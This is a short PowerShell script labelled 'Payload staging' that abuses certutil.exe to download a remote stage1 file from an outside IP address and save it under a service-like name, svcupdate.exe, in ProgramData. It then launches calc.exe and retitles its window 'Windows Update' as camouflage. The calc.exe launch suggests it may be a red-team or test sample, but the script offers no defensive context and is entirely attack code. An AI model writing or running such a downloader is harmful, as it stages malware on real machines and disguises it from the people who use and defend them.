<# Payload staging #>
[CmdletBinding()]
param(
    [string]$EndpointUrl = "https://192.0.2.39/stage1.ps1"
)
try { certutil.exe -urlcache -split -f $EndpointUrl 'C:\ProgramData\svcupdate.exe'; Start-Process -FilePath "calc.exe" -ErrorAction SilentlyContinue; $Host.UI.RawUI.WindowTitle = "Windows Update" } catch { Write-Warning "Stage transfer failed" }
